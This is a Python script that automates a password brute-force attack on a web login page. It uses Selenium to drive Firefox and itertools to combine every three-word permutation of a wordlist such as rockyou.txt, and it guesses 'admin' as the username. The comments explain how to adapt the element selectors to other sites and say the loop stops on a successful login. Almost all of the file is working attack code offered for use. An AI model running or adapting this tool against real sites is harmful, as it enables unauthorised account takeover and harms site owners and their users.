from pwn import *
from itertools import permutations
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException


# set up your search engine of choice to power selenium's web driver and direct driver to the target site's address
gecko_driver_path = "/home/your/path/Downloads/geckodriver"
driver = webdriver.Firefox(executable_path=gecko_driver_path)
driver.get('http://vulnerable-target-site/login')

# ------------------------------------------------------------------------------------------- #
#         Bypass login with Selenium and Itertools automated word list permutations attack
# ------------------------------------------------------------------------------------------- #

# Choose a word list to put in the same directory as script, example - rockyou.txt
# Starts with original word list file then writes
# new file using itertools to join every permutation of words on the original list
# in loop below: "for word in permutations(mix, 3):" - you can change the integer value
# to how many words you want to combine per log-in attempt
# (3 = every combination of words in three's)

with open("password-list.txt", "r") as file:
    word_line = file.read()
    mix = word_line.split()
with open("exp_namelist.txt", "w") as password_file:
    for word in mix:
        password_file.write(word + "\n")
    for word in permutations(mix, 3):
            combos = "".join(word)
            password_file.write(combos + "\n")
    password_file.close()
    file.close()
    print("Done!")
    print(">>> Password List Ready")


# Reads every line from new file while selenium automates log in attempts with every word combination
# This is for bruteforcing the password field only. For this script to work properly you must already know a username, 'admin' is a safe guess to start.
# You will have to make minor adjustments accordingly for selenium to locate the right parts of the page, as all login pages aren't the same.
# Open inspector, right click on fields you want to test and copy the elements "xpath"

with open("exp_namelist.txt", "r") as password_file:
    for name in password_file:
        try:
            driver.find_element_by_name("username").send_keys("admin")
            time.sleep(0.2)
            driver.find_element_by_name("password").send_keys(name)
            time.sleep(0.4)
            log = driver.find_element_by_xpath("/html/body/div/div/div[2]/form/button").click()
            # time.sleep(0.4)
        except NoSuchElementException as log:
               break

# Loop breaks with successful log in

